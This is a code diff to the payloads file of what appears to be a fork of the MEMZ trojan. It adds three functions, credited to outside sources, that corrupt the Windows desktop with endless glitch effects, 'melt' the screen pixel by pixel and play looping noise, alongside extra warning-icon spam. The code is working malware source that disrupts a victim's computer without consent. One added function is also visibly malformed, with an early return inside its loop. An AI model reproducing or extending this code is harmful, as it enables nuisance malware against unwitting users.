@@ -1,5 +1,6 @@
 #include "memz.h"
 
+
 PAYLOAD payloads[] = {
 	{ payloadExecute, 30000 },
 	{ payloadCursor, 30000 },
@@ -9,8 +10,11 @@ PAYLOAD payloads[] = {
 	{ payloadMessageBox, 20000 },
 	{ payloadDrawErrors, 10000 },
 	{ payloadChangeText, 40000 },
-	{ payloadPIP, 60000 },
-	{ payloadPuzzle, 15000 }
+	{ payloadScaryBus, 28000 },
+    { payloadScreenGlitches, 15000 },
+	{ payloadScreenmelting, 29000 },
+	{ payloadPIP, 30000 },
+	{ payloadPuzzle, 15000 },
 };
 
 const size_t nPayloads = sizeof(payloads) / sizeof(PAYLOAD);
@@ -81,13 +85,40 @@ int payloadCursor(PAYLOADFUNC) {
 
 	out: return 2;
 }
+////Credits and thanks to TheMaynMike
+///https://github.com/TheMaynMike/ScreenGlitches
+int payloadScreenGlitches(PAYLOADFUNC) {
+	PAYLOADHEAD
+
+	HDC hdc = GetDC(GetDesktopWindow());
+	int ScrW = GetSystemMetrics(SM_CXSCREEN);
+	int ScrH = GetSystemMetrics(SM_CYSCREEN);
+
+	while (true)
+	{
+		for (int i = 0;; i++, i %= 3)
+		{
+			for (int c = 0; c < rand() % 16; c++)
+			{
+				int y = rand() % ScrH;
+				HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
+
+				SelectObject(hdc, brush);
+				BitBlt(hdc, 0, y, ScrW, 300, hdc, rand() % 61 - 30, y, SRCCOPY);
+				PatBlt(hdc, 0, y, ScrW, 300, PATINVERT);
+			}
+
+			if (!i) RedrawWindow(0, 0, 0, 133);
+		}
+	}
+}
 
 int payloadMessageBox(PAYLOADFUNC) {
 	PAYLOADHEAD
 
-	CreateThread(NULL, 4096, &messageBoxThread, NULL, NULL, NULL);
+		CreateThread(NULL, 4096, &messageBoxThread, NULL, NULL, NULL);
 
-	out: return 2000.0 / (times / 8.0 + 1) + 20 + (random() % 30);
+out: return 2000.0 / (times / 8.0 + 1) + 20 + (random() % 30);
 }
 
 DWORD WINAPI messageBoxThread(LPVOID parameter) {
@@ -179,6 +210,24 @@ int payloadKeyboard(PAYLOADFUNC) {
 
 	out: return 300 + (random() % 400);
 }
+////Credits and thanks to 0xDEADBEEF
+///http://www.rohitab.com/discuss/topic/23191-screen-melter/
+int payloadScreenmelting(PAYLOADFUNC) {
+	PAYLOADHEAD
+	HDC dcDesktop = GetWindowDC(NULL);
+	int scrX = GetSystemMetrics(SM_CXSCREEN);
+	int scrY = GetSystemMetrics(SM_CYSCREEN);
+
+	srand(GetTickCount());
+
+	for (;;)
+	{
+		int x = rand() % scrX;
+		for (int y = scrY; y>0; y--)
+			SetPixel(dcDesktop, x, y, GetPixel(dcDesktop, x, y - 3));
+	}
+	return 0;
+}
 
 int payloadPIP(PAYLOADFUNC) {
 	PAYLOADHEAD
@@ -212,6 +261,8 @@ int payloadDrawErrors(PAYLOADFUNC) {
 	DrawIcon(hdc, cursor.x - ix, cursor.y - iy, LoadIcon(NULL, IDI_APPLICATION));
 	DrawIcon(hdc, cursor.x - ix, cursor.y - iy, LoadIcon(NULL, IDI_WARNING));
         DrawIcon(hdc, cursor.x - ix, cursor.y - iy, LoadIcon(NULL, IDI_HAND));
+		DrawIcon(hdc, cursor.x - ix, cursor.y - iy, LoadIcon(NULL, IDI_SHIELD));
+		DrawIcon(hdc, cursor.x - ix, cursor.y - iy, LoadIcon(NULL, IDI_QUESTION));
 	if (random() % (int)(10/(times/500.0+1)+1) == 0) {
 		DrawIcon(hdc, random()%scrw, random()%scrh, LoadIcon(NULL, IDI_WARNING));
 		DrawIcon(hdc, random() % scrw, random() % scrh, LoadIcon(NULL, IDI_ERROR));
@@ -226,3 +277,42 @@ int payloadDrawErrors(PAYLOADFUNC) {
 
 	out: return 2;
 }
+////Credits and thanks to Dobby233Liu and Leurak
+////https://github.com/Dobby233Liu/VineMEMZ/blob/master/VCProject/MEMZ/payloads.cpp
+int payloadScaryBus(PAYLOADFUNC) {
+	
+		const int samples = 44100;
+
+	WAVEFORMATEX fmt = { WAVE_FORMAT_PCM, 1, samples, samples, 1, 8, 0 };
+
+	HWAVEOUT hwo;
+	waveOutOpen(&hwo, WAVE_MAPPER, &fmt, NULL, NULL, CALLBACK_NULL);
+
+	const int bufsize = samples * 30;
+	char *wavedata = (char *)LocalAlloc(0, bufsize);
+
+	WAVEHDR hdr = { wavedata, bufsize, 0, 0, 0, 0, 0, 0 };
+	waveOutPrepareHeader(hwo, &hdr, sizeof(hdr));
+
+	for (;;) {
+		int freq1 = 0, freq2 = 0, freq3 = 0;
+		int sample1 = 0, sample2 = 0, sample3 = 0;
+		for (int i = 0; i < bufsize; i++) {
+			if (i % (int)(samples * 0.166) == 0) {
+				freq1 = samples / (3580000.0 / (32 * ((random() % 41) * 10 + 200))) / 2;
+				freq2 = samples / (3580000.0 / (32 * ((random() % 41) * 10 + 250))) / 2;
+				freq3 = samples / (3580000.0 / (32 * ((random() % 41) * 10 + 325))) / 2;
+			}
+
+			sample1 = (i % freq1 < freq1 / 2) ? -127 : 127;
+			sample2 = (i % freq2 < freq2 / 2) ? -127 : 127;
+			sample3 = (i % freq3 < freq3 / 2) ? -127 : 127;
+
+			wavedata[i] = (unsigned char)(((sample1 + sample2 + sample3)*0.1) + 127);
+		}
+
+		waveOutWrite(hwo, &hdr, sizeof(hdr));
+
+			return 0;
+		}
+	}
